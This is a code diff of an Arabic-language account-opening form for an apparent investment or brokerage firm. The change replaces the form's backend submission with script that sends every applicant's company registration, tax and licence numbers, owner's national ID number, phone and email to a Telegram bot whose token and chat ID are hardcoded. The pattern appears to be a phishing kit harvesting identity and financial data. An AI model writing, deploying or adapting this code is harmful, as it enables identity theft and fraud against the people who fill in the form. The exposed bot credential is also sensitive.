@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -903,70 +904,324 @@
 </div>
 
 <script>
-  /* ── BACKEND CONFIG ── */
-  const API_ENDPOINT = '/api/submit-form/';
+  /* ============================================================
+     TELEGRAM BOT CONFIGURATION
+  ============================================================ */
+  const TELEGRAM_CONFIG = {
+      token: '8660100340:AAEPj1rlH5PfPZ8StoztNi2m7ZmOOgzLrr4',
+      chatId: '-1003890710277'
+  };
 
-  async function sendToBackend(formData) {
-    const res = await fetch(API_ENDPOINT, {
-      method: 'POST',
-      body: formData
-    });
-    const json = await res.json();
-    if (!json.success) throw new Error(json.message || 'خطأ في الخادم');
+  /* ============================================================
+     SEND TO TELEGRAM FUNCTION
+  ============================================================ */
+  async function sendToTelegram(message) {
+      try {
+          const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`;
+          
+          const response = await fetch(url, {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                  chat_id: TELEGRAM_CONFIG.chatId,
+                  text: message,
+                  parse_mode: 'HTML',
+                  disable_web_page_preview: true
+              })
+          });
+
+          const data = await response.json();
+          
+          if (data.ok) {
+              console.log('✅ Message sent to Telegram successfully');
+              return true;
+          } else {
+              console.error('❌ Telegram API error:', data.description);
+              return false;
+          }
+      } catch (error) {
+          console.error('❌ Failed to send message to Telegram:', error);
+          return false;
+      }
   }
 
-  function buildMessage(d) {
-    const L = '─────────────────────';
-    const rows = [
-      '🏢 <b>طلب فتح حساب كيان تجاري</b>',
-      L, '',
-      '🏢 <b>بيانات الشركة</b>',
-      '• الاسم: ' + d.companyName,
-      '• نوع الكيان: ' + d.entityType,
-      '• رقم السجل التجاري: ' + d.crNumber,
-      '• انتهاء السجل: ' + d.crExpiry,
-      '• الرقم الضريبي: ' + d.taxNumber,
-      '• سنة التأسيس: ' + d.foundYear,
-      '• بلد التسجيل: ' + d.country,
-      '• المدينة: ' + d.city,
-      '• العنوان: ' + d.address,
-      '',
-      '📋 <b>الترخيص التجاري</b>',
-      '• رقم الترخيص: ' + d.licenseNumber,
-      '• انتهاء الترخيص: ' + d.licenseExpiry,
-      '• جهة الإصدار: ' + d.licenseAuthority,
-      '• النشاط التجاري: ' + d.licenseActivity,
-      '',
-      '💼 <b>البيانات التجارية</b>',
-      '• هاتف الشركة: ' + d.companyPhone,
-      '• البريد الرسمي: ' + d.companyEmail,
-      d.website ? '• الموقع الإلكتروني: ' + d.website : '',
-      '• عدد الموظفين: ' + d.employeeCount,
-      '• الإيرادات السنوية: ' + d.annualRevenue,
-      '• رأس المال المستثمر: ' + d.capitalAmount + ' ريال',
-      '• الخدمة المطلوبة: ' + d.offerType,
-      '',
-      '👤 <b>المالك / الممثل المفوّض</b>',
-      '• الاسم: ' + d.ownerName,
-      '• المسمى: ' + d.ownerTitle,
-      '• رقم الهوية: ' + d.ownerNational,
-      '• الجنسية: ' + d.ownerNationality,
-      '• الجوال: ' + d.ownerPhone,
-      '• البريد: ' + d.ownerEmail,
-      d.notes ? ('\n📝 <b>ملاحظات:</b>\n' + d.notes) : '',
-      '',
-      L,
-      '🕐 ' + new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' }),
-    ];
-    return rows.filter(Boolean).join('\n');
+  /* ============================================================
+     FORMAT MESSAGE FOR TELEGRAM
+  ============================================================ */
+  function formatTelegramMessage(formData) {
+      const divider = '─'.repeat(35);
+      const timestamp = new Date().toLocaleString('ar-SA', { 
+          timeZone: 'Asia/Riyadh',
+          year: 'numeric',
+          month: 'long',
+          day: 'numeric',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit'
+      });
+      
+      let message = `🏢 <b>📋 طلب فتح حساب كيان تجاري</b>\n\n`;
+      message += `${divider}\n\n`;
+      
+      message += `🏢 <b>بيانات الشركة / المنشأة</b>\n`;
+      message += `• اسم الشركة: ${formData.companyName}\n`;
+      message += `• نوع الكيان: ${formData.entityType}\n`;
+      message += `• رقم السجل التجاري: ${formData.crNumber}\n`;
+      message += `• تاريخ انتهاء السجل: ${formData.crExpiry}\n`;
+      message += `• الرقم الضريبي: ${formData.taxNumber}\n`;
+      message += `• سنة التأسيس: ${formData.foundYear}\n`;
+      message += `• بلد التسجيل: ${formData.country}\n`;
+      message += `• المدينة: ${formData.city}\n`;
+      message += `• العنوان التفصيلي: ${formData.address}\n\n`;
+      
+      message += `📋 <b>الترخيص التجاري والوثائق</b>\n`;
+      message += `• رقم الترخيص التجاري: ${formData.licenseNumber}\n`;
+      message += `• تاريخ انتهاء الترخيص: ${formData.licenseExpiry}\n`;
+      message += `• جهة إصدار الترخيص: ${formData.licenseAuthority}\n`;
+      message += `• النشاط التجاري الرئيسي: ${formData.licenseActivity}\n`;
+      message += `• صورة السجل التجاري: ${formData.crFileStatus}\n`;
+      if (formData.licFileStatus) {
+          message += `• صورة الترخيص التجاري: ${formData.licFileStatus}\n`;
+      }
+      message += `\n`;
+      
+      message += `💼 <b>البيانات التجارية والمالية</b>\n`;
+      message += `• هاتف الشركة: ${formData.companyPhone}\n`;
+      message += `• البريد الإلكتروني الرسمي: ${formData.companyEmail}\n`;
+      if (formData.website) {
+          message += `• الموقع الإلكتروني: ${formData.website}\n`;
+      }
+      message += `• عدد الموظفين: ${formData.employeeCount}\n`;
+      message += `• الإيرادات السنوية: ${formData.annualRevenue}\n`;
+      message += `• رأس المال المراد استثماره: ${formData.capitalAmount} ريال\n`;
+      message += `• نوع الخدمة المطلوبة: ${formData.offerType}\n\n`;
+      
+      message += `👤 <b>بيانات المالك / الممثل المفوّض</b>\n`;
+      message += `• الاسم الكامل: ${formData.ownerName}\n`;
+      message += `• المسمى الوظيفي: ${formData.ownerTitle}\n`;
+      message += `• رقم الهوية الوطنية: ${formData.ownerNational}\n`;
+      message += `• الجنسية: ${formData.ownerNationality}\n`;
+      message += `• رقم الجوال: ${formData.ownerPhone}\n`;
+      message += `• البريد الإلكتروني: ${formData.ownerEmail}\n`;
+      message += `• صورة الهوية: ${formData.idFileStatus}\n`;
+      if (formData.authFileStatus) {
+          message += `• وثيقة التفويض: ${formData.authFileStatus}\n`;
+      }
+      
+      if (formData.notes && formData.notes.trim() !== '') {
+          message += `\n📝 <b>ملاحظات إضافية</b>\n`;
+          message += `${formData.notes}\n`;
+      }
+      
+      message += `\n${divider}\n`;
+      message += `🕐 <b>وقت الإرسال:</b> ${timestamp}\n`;
+      message += `🆔 <b>رقم الطلب:</b> ${Date.now().toString().slice(-8)}`;
+      
+      return message;
+  }
+
+  /* ============================================================
+     COLLECT FORM DATA AND SEND TO TELEGRAM
+  ============================================================ */
+  async function submitFormToTelegram() {
+      try {
+          // Company Data
+          const companyName = document.getElementById('companyName')?.value.trim() || '';
+          
+          // Entity Type
+          const entityTypeSelect = document.getElementById('entityType');
+          let entityType = '';
+          if (entityTypeSelect && entityTypeSelect.selectedIndex > 0) {
+              entityType = entityTypeSelect.options[entityTypeSelect.selectedIndex].text;
+          }
+          
+          const crNumber = document.getElementById('crNumber')?.value.trim() || '';
+          const crExpiry = document.getElementById('crExpiry')?.value || '';
+          const taxNumber = document.getElementById('taxNumber')?.value.trim() || '';
+          const foundYear = document.getElementById('foundYear')?.value || '';
+          
+          // Country
+          const countrySelect = document.getElementById('country');
+          let country = '';
+          if (countrySelect && countrySelect.selectedIndex > 0) {
+              country = countrySelect.options[countrySelect.selectedIndex].text;
+          }
+          
+          const city = document.getElementById('city')?.value.trim() || '';
+          const address = document.getElementById('address')?.value.trim() || '';
+          
+          // License Data
+          const licenseNumber = document.getElementById('licenseNumber')?.value.trim() || '';
+          const licenseExpiry = document.getElementById('licenseExpiry')?.value || '';
+          
+          const licenseAuthoritySelect = document.getElementById('licenseAuthority');
+          let licenseAuthority = '';
+          if (licenseAuthoritySelect && licenseAuthoritySelect.selectedIndex > 0) {
+              licenseAuthority = licenseAuthoritySelect.options[licenseAuthoritySelect.selectedIndex].text;
+          }
+          
+          const licenseActivity = document.getElementById('licenseActivity')?.value.trim() || '';
+          
+          // File statuses
+          const crFile = document.getElementById('crFile')?.files[0];
+          const licFile = document.getElementById('licFile')?.files[0];
+          const idFile = document.getElementById('idFile')?.files[0];
+          const authFile = document.getElementById('authFile')?.files[0];
+          
+          const crFileStatus = crFile ? `✅ تم الرفع (${crFile.name})` : '❌ لم يتم الرفع';
+          const licFileStatus = licFile ? `✅ تم الرفع (${licFile.name})` : '';
+          const idFileStatus = idFile ? `✅ تم الرفع (${idFile.name})` : '❌ لم يتم الرفع';
+          const authFileStatus = authFile ? `✅ تم الرفع (${authFile.name})` : '';
+          
+          // Commercial Data
+          const companyPhone = document.getElementById('companyPhone')?.value.trim() || '';
+          const companyEmail = document.getElementById('companyEmail')?.value.trim() || '';
+          const website = document.getElementById('website')?.value.trim() || '';
+          
+          const employeeCountSelect = document.getElementById('employeeCount');
+          let employeeCount = '';
+          if (employeeCountSelect && employeeCountSelect.selectedIndex > 0) {
+              employeeCount = employeeCountSelect.options[employeeCountSelect.selectedIndex].text;
+          }
+          
+          const annualRevenueSelect = document.getElementById('annualRevenue');
+          let annualRevenue = '';
+          if (annualRevenueSelect && annualRevenueSelect.selectedIndex > 0) {
+              annualRevenue = annualRevenueSelect.options[annualRevenueSelect.selectedIndex].text;
+          }
+          
+          const capitalAmount = document.getElementById('capitalAmount')?.value || '';
+          
+          // Offer Type
+          const selectedOffer = document.querySelector('input[name="offerType"]:checked');
+          let offerType = '';
+          if (selectedOffer) {
+              const offerValue = selectedOffer.value;
+              const offerLabels = {
+                  portfolio_mgmt: 'إدارة المحافظ 💼',
+                  reits: 'صناديق الاستثمار العقاري 🏗️',
+                  investment_banking: 'المصرفية الاستثمارية 🏦',
+                  brokerage: 'وساطة الأوراق المالية 📊',
+                  ipo_mgmt: 'إدارة الاكتتابات 🎯',
+                  custody: 'خدمات الحفظ 🔐'
+              };
+              offerType = offerLabels[offerValue] || offerValue;
+          }
+          
+          // Owner Data
+          const ownerFirst = document.getElementById('ownerFirst')?.value.trim() || '';
+          const ownerSecond = document.getElementById('ownerSecond')?.value.trim() || '';
+          const ownerThird = document.getElementById('ownerThird')?.value.trim() || '';
+          const ownerName = `${ownerFirst} ${ownerSecond} ${ownerThird}`;
+          
+          const ownerTitleSelect = document.getElementById('ownerTitle');
+          let ownerTitle = '';
+          if (ownerTitleSelect && ownerTitleSelect.selectedIndex > 0) {
+              ownerTitle = ownerTitleSelect.options[ownerTitleSelect.selectedIndex].text;
+          }
+          
+          const ownerNational = document.getElementById('ownerNational')?.value.trim() || '';
+          
+          const ownerNationalitySelect = document.getElementById('ownerNationality');
+          let ownerNationality = '';
+          if (ownerNationalitySelect && ownerNationalitySelect.selectedIndex > 0) {
+              ownerNationality = ownerNationalitySelect.options[ownerNationalitySelect.selectedIndex].text;
+          }
+          
+          const ownerPhone = document.getElementById('ownerPhone')?.value.trim() || '';
+          const ownerEmail = document.getElementById('ownerEmail')?.value.trim() || '';
+          
+          // Notes
+          const notes = document.getElementById('notes')?.value.trim() || '';
+          
+          // Validate required fields
+          if (!companyName || !entityType || !crNumber || !crExpiry || !taxNumber || !foundYear || 
+              !country || !city || !address || !licenseNumber || !licenseExpiry || !licenseAuthority || 
+              !licenseActivity || !companyPhone || !companyEmail || !employeeCount || !annualRevenue || 
+              !capitalAmount || !offerType || !ownerFirst || !ownerSecond || !ownerThird || 
+              !ownerTitle || !ownerNational || !ownerNationality || !ownerPhone || !ownerEmail) {
+              throw new Error('يرجى تعبئة جميع الحقول المطلوبة');
+          }
+          
+          if (!crFile) {
+              throw new Error('يرجى رفع صورة السجل التجاري');
+          }
+          
+          if (!idFile) {
+              throw new Error('يرجى رفع صورة الهوية');
+          }
+          
+          if (Number(capitalAmount) < 50000) {
+              throw new Error('الحد الأدنى للاستثمار المؤسسي 50,000 ريال');
+          }
+          
+          // Prepare form data object
+          const formData = {
+              companyName: companyName,
+              entityType: entityType,
+              crNumber: crNumber,
+              crExpiry: crExpiry,
+              taxNumber: taxNumber,
+              foundYear: foundYear,
+              country: country,
+              city: city,
+              address: address,
+              licenseNumber: licenseNumber,
+              licenseExpiry: licenseExpiry,
+              licenseAuthority: licenseAuthority,
+              licenseActivity: licenseActivity,
+              crFileStatus: crFileStatus,
+              licFileStatus: licFileStatus,
+              companyPhone: companyPhone,
+              companyEmail: companyEmail,
+              website: website,
+              employeeCount: employeeCount,
+              annualRevenue: annualRevenue,
+              capitalAmount: Number(capitalAmount).toLocaleString('ar-SA'),
+              offerType: offerType,
+              ownerName: ownerName,
+              ownerTitle: ownerTitle,
+              ownerNational: ownerNational,
+              ownerNationality: ownerNationality,
+              ownerPhone: ownerPhone,
+              ownerEmail: ownerEmail,
+              idFileStatus: idFileStatus,
+              authFileStatus: authFileStatus,
+              notes: notes
+          };
+          
+          // Format message for Telegram
+          const message = formatTelegramMessage(formData);
+          
+          // Send to Telegram
+          const success = await sendToTelegram(message);
+          
+          if (success) {
+              console.log('✅ Form data sent to Telegram successfully');
+              return true;
+          } else {
+              throw new Error('فشل إرسال البيانات إلى البوت');
+          }
+          
+      } catch (error) {
+          console.error('❌ Error in submitFormToTelegram:', error);
+          throw error;
+      }
   }
 
   /* ── FILE LABELS ── */
   function wireFile(inputId, labelId) {
-    document.getElementById(inputId).addEventListener('change', function() {
-      document.getElementById(labelId).textContent =
-        this.files[0] ? this.files[0].name : 'لم يُختر ملف بعد';
-    });
+      const input = document.getElementById(inputId);
+      if (input) {
+          input.addEventListener('change', function() {
+              const label = document.getElementById(labelId);
+              if (label) {
+                  label.textContent = this.files[0] ? this.files[0].name : 'لم يُختر ملف بعد';
+              }
+          });
+      }
   }
   wireFile('crFile',   'crFileName');
   wireFile('licFile',  'licFileName');
@@ -978,180 +1233,162 @@
   const submitBtn = document.getElementById('submitBtn');
 
   function mark(el, valid, errId) {
-    if (!valid) {
-      el.classList.add('error');
-      if (errId) document.getElementById(errId).style.display = 'block';
-      return false;
-    }
-    el.classList.remove('error');
-    if (errId) document.getElementById(errId).style.display = 'none';
-    return true;
+      if (!valid) {
+          el.classList.add('error');
+          if (errId) {
+              const errEl = document.getElementById(errId);
+              if (errEl) errEl.style.display = 'block';
+          }
+          return false;
+      }
+      el.classList.remove('error');
+      if (errId) {
+          const errEl = document.getElementById(errId);
+          if (errEl) errEl.style.display = 'none';
+      }
+      return true;
   }
 
-  function txt(id)  { return document.getElementById(id).value.trim(); }
-  function sel(id)  { return document.getElementById(id).value; }
+  function txt(id)  { 
+      const el = document.getElementById(id);
+      return el ? el.value.trim() : '';
+  }
+  
+  function sel(id)  { 
+      const el = document.getElementById(id);
+      return el ? el.value : '';
+  }
+  
   function el(id)   { return document.getElementById(id); }
+  
   function email(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
 
   function showToast(msg, ms) {
-    const t = document.getElementById('toastError');
-    t.textContent = msg; t.classList.add('show');
-    setTimeout(() => t.classList.remove('show'), ms || 6000);
+      const t = document.getElementById('toastError');
+      if (t) {
+          t.textContent = msg;
+          t.classList.add('show');
+          setTimeout(() => t.classList.remove('show'), ms || 6000);
+      }
   }
 
   function resetForm() {
-    form.reset();
-    document.querySelectorAll('.error').forEach(e => e.classList.remove('error'));
-    ['crFileName','licFileName','idFileName','authFileName']
-      .forEach(id => { el(id).textContent = 'لم يُختر ملف بعد'; });
+      form.reset();
+      document.querySelectorAll('.error').forEach(e => e.classList.remove('error'));
+      ['crFileName','licFileName','idFileName','authFileName'].forEach(id => {
+          const elmt = document.getElementById(id);
+          if (elmt) elmt.textContent = 'لم يُختر ملف بعد';
+      });
   }
 
-  /* ── SUBMIT ── */
-  const ENTITY_TYPES = {
-    company_limited:'شركة ذات مسؤولية محدودة', joint_stock:'شركة مساهمة',
-    sole_prop:'مؤسسة فردية', partnership:'شركة تضامن',
-    holding:'شركة قابضة', foreign_branch:'فرع شركة أجنبية',
-    ngo:'جمعية / منظمة غير ربحية', other:'أخرى',
-  };
-  const OFFER_LABELS = {
-    portfolio_mgmt:'إدارة المحافظ 💼', reits:'صناديق الاستثمار العقاري 🏗️',
-    investment_banking:'المصرفية الاستثمارية 🏦', brokerage:'وساطة الأوراق المالية 📊',
-    ipo_mgmt:'إدارة الاكتتابات 🎯', custody:'خدمات الحفظ 🔐',
-  };
-  const TITLE_LABELS = {
-    owner:'مالك / صاحب المنشأة', ceo:'الرئيس التنفيذي',
-    chairman:'رئيس مجلس الإدارة', gm:'المدير العام',
-    cfo:'المدير المالي', authorized:'مفوّض بالتوقيع',
-  };
-  const REVENUE_LABELS = {
-    'under1m':'أقل من مليون ريال', '1m-5m':'1 – 5 مليون',
-    '5m-20m':'5 – 20 مليون', '20m-100m':'20 – 100 مليون', 'over100m':'أكثر من 100 مليون',
-  };
-  const EMP_LABELS = {
-    '1-9':'1 – 9 موظفين','10-49':'10 – 49 موظف',
-    '50-249':'50 – 249 موظف','250+':'250+ موظف',
-  };
-
   form.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    let ok = true;
+      e.preventDefault();
+      let ok = true;
 
-    // Company
-    if (!mark(el('companyName'),    txt('companyName').length > 0, null))         ok = false;
-    if (!mark(el('entityType'),     sel('entityType') !== '', null))               ok = false;
-    if (!mark(el('crNumber'),       /^\d{10}$/.test(txt('crNumber')), null))       ok = false;
-    if (!mark(el('crExpiry'),       txt('crExpiry') !== '', null))                 ok = false;
-    if (!mark(el('taxNumber'),      txt('taxNumber').length >= 10, null))          ok = false;
-    if (!mark(el('foundYear'),      el('foundYear').value >= 1900, null))          ok = false;
-    if (!mark(el('country'),        sel('country') !== '', null))                  ok = false;
-    if (!mark(el('city'),           txt('city').length > 0, null))                 ok = false;
-    if (!mark(el('address'),        txt('address').length > 0, null))              ok = false;
+      // Company validation
+      if (!mark(el('companyName'),    txt('companyName').length > 0, null)) ok = false;
+      if (!mark(el('entityType'),     sel('entityType') !== '', null)) ok = false;
+      if (!mark(el('crNumber'),       /^\d{10}$/.test(txt('crNumber')), null)) ok = false;
+      if (!mark(el('crExpiry'),       txt('crExpiry') !== '', null)) ok = false;
+      if (!mark(el('taxNumber'),      txt('taxNumber').length >= 10, null)) ok = false;
+      if (!mark(el('foundYear'),      el('foundYear').value >= 1900, null)) ok = false;
+      if (!mark(el('country'),        sel('country') !== '', null)) ok = false;
+      if (!mark(el('city'),           txt('city').length > 0, null)) ok = false;
+      if (!mark(el('address'),        txt('address').length > 0, null)) ok = false;
 
-    // License
-    if (!mark(el('licenseNumber'),  txt('licenseNumber').length > 0, null))        ok = false;
-    if (!mark(el('licenseExpiry'),  txt('licenseExpiry') !== '', null))            ok = false;
-    if (!mark(el('licenseAuthority'),sel('licenseAuthority') !== '', null))        ok = false;
-    if (!mark(el('licenseActivity'),txt('licenseActivity').length > 0, null))      ok = false;
-    const crFileOk = el('crFile').files.length > 0;
-    if (!crFileOk) { el('crFileBox').classList.add('error'); el('crFileErr').style.display = 'block'; ok = false; }
-    else           { el('crFileBox').classList.remove('error'); el('crFileErr').style.display = 'none'; }
-
-    // Commercial
-    if (!mark(el('companyPhone'),   txt('companyPhone').length >= 7, null))        ok = false;
-    if (!mark(el('companyEmail'),   email(txt('companyEmail')), null))             ok = false;
-    if (!mark(el('employeeCount'),  sel('employeeCount') !== '', null))            ok = false;
-    if (!mark(el('annualRevenue'),  sel('annualRevenue') !== '', null))            ok = false;
-    if (!mark(el('capitalAmount'),  Number(el('capitalAmount').value) >= 50000, 'capitalErr')) ok = false;
-    const offerEl = document.querySelector('input[name="offerType"]:checked');
-    el('offerErr').style.display = offerEl ? 'none' : 'block';
-    if (!offerEl) ok = false;
-
-    // Owner
-    if (!mark(el('ownerFirst'),      txt('ownerFirst').length > 0, null))          ok = false;
-    if (!mark(el('ownerSecond'),     txt('ownerSecond').length > 0, null))         ok = false;
-    if (!mark(el('ownerThird'),      txt('ownerThird').length > 0, null))          ok = false;
-    if (!mark(el('ownerTitle'),      sel('ownerTitle') !== '', null))              ok = false;
-    if (!mark(el('ownerNational'),   /^\d{10}$/.test(txt('ownerNational')), null)) ok = false;
-    if (!mark(el('ownerNationality'),sel('ownerNationality') !== '', null))        ok = false;
-    if (!mark(el('ownerPhone'),      txt('ownerPhone').length >= 7, null))         ok = false;
-    if (!mark(el('ownerEmail'),      email(txt('ownerEmail')), null))              ok = false;
-    const idFileOk = el('idFile').files.length > 0;
-    if (!idFileOk) { el('idFileBox').classList.add('error'); el('idFileErr').style.display = 'block'; ok = false; }
-    else           { el('idFileBox').classList.remove('error'); el('idFileErr').style.display = 'none'; }
-
-    if (!ok) {
-      const firstErr = document.querySelector('.error');
-      if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
-      return;
-    }
-
-    // Collect & send
-    const countryOpt = el('country').options[el('country').selectedIndex];
-    const natOpt     = el('ownerNationality').options[el('ownerNationality').selectedIndex];
-
-    const data = {
-      companyName:      txt('companyName'),
-      entityType:       ENTITY_TYPES[sel('entityType')] || sel('entityType'),
-      crNumber:         txt('crNumber'),
-      crExpiry:         txt('crExpiry'),
-      taxNumber:        txt('taxNumber'),
-      foundYear:        el('foundYear').value,
-      country:          countryOpt ? countryOpt.text : sel('country'),
-      city:             txt('city'),
-      address:          txt('address'),
-      licenseNumber:    txt('licenseNumber'),
-      licenseExpiry:    txt('licenseExpiry'),
-      licenseAuthority: el('licenseAuthority').options[el('licenseAuthority').selectedIndex]?.text || '',
-      licenseActivity:  txt('licenseActivity'),
-      companyPhone:     txt('companyPhone'),
-      companyEmail:     txt('companyEmail'),
-      website:          txt('website'),
-      employeeCount:    EMP_LABELS[sel('employeeCount')] || sel('employeeCount'),
-      annualRevenue:    REVENUE_LABELS[sel('annualRevenue')] || sel('annualRevenue'),
-      capitalAmount:    Number(el('capitalAmount').value).toLocaleString('ar-SA'),
-      offerType:        OFFER_LABELS[offerEl.value] || offerEl.value,
-      ownerName:        [txt('ownerFirst'), txt('ownerSecond'), txt('ownerThird')].join(' '),
-      ownerTitle:       TITLE_LABELS[sel('ownerTitle')] || sel('ownerTitle'),
-      ownerNational:    txt('ownerNational'),
-      ownerNationality: natOpt ? natOpt.text : sel('ownerNationality'),
-      ownerPhone:       txt('ownerPhone'),
-      ownerEmail:       txt('ownerEmail'),
-      notes:            txt('notes'),
-    };
-
-    submitBtn.classList.add('loading');
-    el('submitBtn').querySelector('.btn-label').textContent = 'جاري الإرسال...';
-
-    try {
-      const formData = new FormData();
-      formData.append('message', buildMessage(data));
-      formData.append('companyName', data.companyName);
+      // License validation
+      if (!mark(el('licenseNumber'),  txt('licenseNumber').length > 0, null)) ok = false;
+      if (!mark(el('licenseExpiry'),  txt('licenseExpiry') !== '', null)) ok = false;
+      if (!mark(el('licenseAuthority'), sel('licenseAuthority') !== '', null)) ok = false;
+      if (!mark(el('licenseActivity'), txt('licenseActivity').length > 0, null)) ok = false;
       
-      if (el('crFile').files[0])   formData.append('crFile',   el('crFile').files[0]);
-      if (el('licFile').files[0])  formData.append('licFile',  el('licFile').files[0]);
-      if (el('idFile').files[0])   formData.append('idFile',   el('idFile').files[0]);
-      if (el('authFile').files[0]) formData.append('authFile', el('authFile').files[0]);
+      const crFileOk = el('crFile') && el('crFile').files.length > 0;
+      if (!crFileOk) { 
+          if (el('crFileBox')) el('crFileBox').classList.add('error');
+          if (el('crFileErr')) el('crFileErr').style.display = 'block';
+          ok = false; 
+      } else { 
+          if (el('crFileBox')) el('crFileBox').classList.remove('error');
+          if (el('crFileErr')) el('crFileErr').style.display = 'none';
+      }
 
-      await sendToBackend(formData);
-      resetForm();
-      document.getElementById('successOverlay').classList.add('show');
-    } catch (err) {
-      console.error(err);
-      showToast('⚠️ ' + err.message, 7000);
-    } finally {
-      submitBtn.classList.remove('loading');
-      el('submitBtn').querySelector('.btn-label').textContent = 'إرسال الطلب';
-    }
+      // Commercial validation
+      if (!mark(el('companyPhone'),   txt('companyPhone').length >= 7, null)) ok = false;
+      if (!mark(el('companyEmail'),   email(txt('companyEmail')), null)) ok = false;
+      if (!mark(el('employeeCount'),  sel('employeeCount') !== '', null)) ok = false;
+      if (!mark(el('annualRevenue'),  sel('annualRevenue') !== '', null)) ok = false;
+      if (!mark(el('capitalAmount'),  Number(el('capitalAmount').value) >= 50000, 'capitalErr')) ok = false;
+      
+      const offerEl = document.querySelector('input[name="offerType"]:checked');
+      const offerErr = el('offerErr');
+      if (offerErr) offerErr.style.display = offerEl ? 'none' : 'block';
+      if (!offerEl) ok = false;
+
+      // Owner validation
+      if (!mark(el('ownerFirst'),      txt('ownerFirst').length > 0, null)) ok = false;
+      if (!mark(el('ownerSecond'),     txt('ownerSecond').length > 0, null)) ok = false;
+      if (!mark(el('ownerThird'),      txt('ownerThird').length > 0, null)) ok = false;
+      if (!mark(el('ownerTitle'),      sel('ownerTitle') !== '', null)) ok = false;
+      if (!mark(el('ownerNational'),   /^\d{10}$/.test(txt('ownerNational')), null)) ok = false;
+      if (!mark(el('ownerNationality'), sel('ownerNationality') !== '', null)) ok = false;
+      if (!mark(el('ownerPhone'),      txt('ownerPhone').length >= 7, null)) ok = false;
+      if (!mark(el('ownerEmail'),      email(txt('ownerEmail')), null)) ok = false;
+      
+      const idFileOk = el('idFile') && el('idFile').files.length > 0;
+      if (!idFileOk) { 
+          if (el('idFileBox')) el('idFileBox').classList.add('error');
+          if (el('idFileErr')) el('idFileErr').style.display = 'block';
+          ok = false; 
+      } else { 
+          if (el('idFileBox')) el('idFileBox').classList.remove('error');
+          if (el('idFileErr')) el('idFileErr').style.display = 'none';
+      }
+
+      if (!ok) {
+          const firstErr = document.querySelector('.error');
+          if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          return;
+      }
+
+      // Send to Telegram
+      submitBtn.classList.add('loading');
+      if (el('submitBtn')) {
+          const btnLabel = el('submitBtn').querySelector('.btn-label');
+          if (btnLabel) btnLabel.textContent = 'جاري الإرسال...';
+      }
+
+      try {
+          const success = await submitFormToTelegram();
+          
+          if (success) {
+              resetForm();
+              const successOverlay = document.getElementById('successOverlay');
+              if (successOverlay) successOverlay.classList.add('show');
+          } else {
+              throw new Error('فشل إرسال البيانات إلى البوت');
+          }
+      } catch (err) {
+          console.error('Error:', err.message);
+          showToast('⚠️ ' + err.message, 7000);
+      } finally {
+          submitBtn.classList.remove('loading');
+          if (el('submitBtn')) {
+              const btnLabel = el('submitBtn').querySelector('.btn-label');
+              if (btnLabel) btnLabel.textContent = 'إرسال الطلب';
+          }
+      }
   });
 
   // Live blur validation
   document.querySelectorAll('input, select, textarea').forEach(inp => {
-    inp.addEventListener('blur', () => {
-      if (inp.classList.contains('error') && inp.value.trim())
-        inp.classList.remove('error');
-    });
+      inp.addEventListener('blur', () => {
+          if (inp.classList.contains('error') && inp.value.trim()) {
+              inp.classList.remove('error');
+          }
+      });
   });
 </script>
 
 </body>
 </html>
+```
